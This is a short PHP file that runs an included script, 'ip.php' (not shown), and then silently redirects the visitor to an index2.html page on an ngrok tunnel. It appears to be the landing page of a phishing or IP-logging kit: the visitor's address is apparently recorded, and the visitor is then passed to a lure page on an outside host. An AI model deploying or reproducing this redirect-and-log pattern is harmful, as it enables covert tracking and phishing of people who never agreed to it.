<?php
include 'ip.php';
header('Location: https://f31f153b1a17.ngrok.io/index2.html');
exit
?>
